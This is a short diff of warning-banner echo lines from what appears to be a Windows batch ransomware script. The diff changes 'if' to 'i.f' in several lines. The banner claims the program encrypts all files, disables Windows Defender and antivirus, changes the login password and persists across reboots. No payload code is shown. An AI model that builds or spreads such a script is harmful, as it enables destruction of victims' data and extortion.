@@ -55,12 +55,12 @@ echo Recognize the dangers of this code and handle it with care. Don't run it on
 echo Ransomware can infect your computer. I.f you are infected, please recover by referring to the #recovery key below. 
 echo This virus is very difficult to recover and can be dangerous if used for real attack purposes.
 echo There are many more risks like encrypting all files, disabling Windows defense, disabling computer antivirus similar to several antiviruses, changing computer login password, etc. 
-echo Use with caution. For reference, this virus comes back to life even if the computer is rebooted.
+echo Use with caution. For reference, this virus comes back to life even i.f the computer is rebooted.
 echo Bottom line, don't run this virus! The creator believes that this damage will be substantial, and cannot guarantee any damage.
-echo See above. Finally, if you remake this code, please credit this author and source.
+echo See above. Finally, i.f you remake this code, please credit this author and source.
 echo .
 echo .
-echo If you don't want this virus running, close the window quickly without pressing any key!!!!!
+echo I.f you don't want this virus running, close the window quickly without pressing any key!!!!!
 echo .
 echo .
 pause
